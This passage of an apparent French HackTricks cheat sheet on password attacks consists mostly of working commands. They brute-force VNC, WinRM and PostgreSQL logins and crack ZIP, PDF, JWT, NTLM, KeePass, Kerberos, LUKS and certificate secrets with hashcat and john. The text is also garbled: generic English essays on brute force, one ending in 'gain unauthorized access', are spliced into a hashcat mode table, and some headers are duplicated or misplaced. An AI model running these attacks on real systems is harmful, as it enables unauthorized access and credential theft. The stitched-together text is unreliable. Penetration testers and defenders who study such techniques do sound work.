patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm (Windows Remote Management) est un protocole de gestion à distance utilisé pour l'administration des systèmes Windows.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Local

### Bases de données de craquage en ligne

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 avec/sans ESS/SSP et avec n'importe quelle valeur de défi)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, captures WPA2, et archives MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes et hash de fichiers)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Consultez ceci avant d'essayer de faire une attaque par force brute sur un Hash.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Attaque par force brute de texte en clair connu

Vous devez connaître le **texte en clair** (ou une partie du texte en clair) **d'un fichier contenu à l'intérieur** du zip chiffré. Vous pouvez vérifier les **noms de fichiers et la taille des fichiers contenus à l'intérieur** d'un zip chiffré en exécutant : **`7z l encrypted.zip`**\
Téléchargez [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) depuis la page des versions.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

### 7z
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

#### Brute Force

Brute force attacks consist of systematically checking all possible keys or passwords until the correct one is found. This method is usually used when the key space is small enough to be easily searched. Brute force attacks can be time-consuming but are almost always successful if given enough time.

#### Protection

To protect against brute force attacks, it is essential to use strong and complex passwords that are not easily guessable. Additionally, implementing account lockout policies after a certain number of failed login attempts can help mitigate the risk of a successful brute force attack.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Mot de passe propriétaire PDF

Pour craquer un mot de passe propriétaire PDF, consultez ceci : [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Craquage NTLM
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

### Keepass
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting est une technique d'attaque qui cible les services Kerberos pour extraire des informations sensibles à partir des tickets de service.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Image Lucks

#### Méthode 1

Installer : [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Méthode 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
### Mysql

Un autre tutoriel Luks BF : [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Clé privée PGP/GPG
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

### Clé maître DPAPI

Utilisez [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) puis john

### Colonne protégée par mot de passe dans Open Office

Si vous avez un fichier xlsx avec une colonne protégée par un mot de passe, vous pouvez la déprotéger :

* **Téléchargez-le sur Google Drive** et le mot de passe sera automatiquement supprimé
* Pour le **supprimer** **manuellement** :
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Certificats PFX
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Outils

**Exemples de hash :** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Identification de hash
```bash
hash-identifier
> <HASH>
```
### Listes de mots

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Outils de génération de listes de mots**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Générateur avancé de séquences de touches avec des caractères de base configurables, une disposition de touches et des itinéraires.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Mutation de John

Lisez _**/etc/john/john.conf**_ et configurez-le
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Attaques Hashcat

* **Attaque par liste de mots** (`-a 0`) avec des règles

**Hashcat** est déjà livré avec un **dossier contenant des règles** mais vous pouvez trouver [**d'autres règles intéressantes ici**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Attaque de combinaison de listes de mots**

Il est possible de **combiner 2 listes de mots en 1** avec hashcat.\
Si la liste 1 contenait le mot **"hello"** et que la deuxième contenait 2 lignes avec les mots **"world"** et **"earth"**. Les mots `helloworld` et `helloearth` seront générés.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Attaque par masque** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Attaque Wordlist + Masque (`-a 6`) / Masque + Wordlist (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Modes Hashcat
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
## Brute Force

### Description

Brute force is a common technique used to crack passwords by systematically trying all possible combinations of characters until the correct one is found. This method is often used to crack Linux hashes stored in the `/etc/shadow` file.

### Tools

- **John the Ripper**: A popular password cracking tool that can be used for brute force attacks.
- **Hashcat**: Another powerful tool for cracking passwords using brute force and other techniques.

### Methodology

1. Obtain the hash from the `/etc/shadow` file.
2. Use a password cracking tool like John the Ripper or Hashcat to perform a brute force attack.
3. Configure the tool to try different combinations of characters, such as letters, numbers, and symbols.
4. Monitor the progress of the brute force attack and wait for the correct password to be found.
5. Once the password is cracked, it can be used to gain unauthorized access to the system.

### Prevention

- Use strong, complex passwords that are less susceptible to brute force attacks.
- Implement multi-factor authentication to add an extra layer of security.
- Regularly update passwords and monitor for any unauthorized access attempts.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# Brute Force

## Introduction

Brute force attacks are a common way to crack passwords. They consist of trying all possible combinations until the correct one is found.

## Tools

There are several tools available for performing brute force attacks, such as Hydra, Medusa, and John the Ripper.

## Methodology

1. **Password List**: Start by creating or obtaining a password list to use in the brute force attack.
2. **Select Tool**: Choose a suitable tool for the attack, considering factors like the target system and protocols.
3. **Configure Tool**: Set up the tool with the target system's information and the password list.
4. **Initiate Attack**: Launch the brute force attack and wait for the tool to find the correct password.
5. **Post-Exploitation**: Once the password is found, use it to gain unauthorized access to the system.

## Conclusion

Brute force attacks can be effective in cracking passwords, but they can be time-consuming and resource-intensive. It is essential to use them responsibly and ethically.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
## Brute-Force

### Introduction

Brute-force attacks are a common method used to crack hashes. This technique involves trying all possible combinations of characters until the correct one is found. Brute-force attacks can be time-consuming but are effective against weak passwords.

### Tools

There are various tools available for conducting brute-force attacks, such as **John the Ripper**, **Hashcat**, and **Hydra**. These tools can be used to automate the process of trying different combinations of characters to crack hashes.

### Methodology

1. **Wordlist Attack**: In this method, a predefined list of words is used to try and crack the hash. This is effective if the password is a common word or phrase.

2. **Mask Attack**: A mask attack involves creating a custom mask to define the characters and length of the password. This method is useful when you have some information about the password, such as its length or character set.

3. **Hybrid Attack**: A hybrid attack combines the wordlist and mask attacks to increase the chances of cracking the hash. This method is useful for passwords that are not easily guessed but may still be based on common words or patterns.

### Conclusion

Brute-force attacks can be a powerful tool for cracking common application hashes. By using the right tools and methodologies, hackers can effectively crack weak passwords and gain unauthorized access to systems and accounts.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
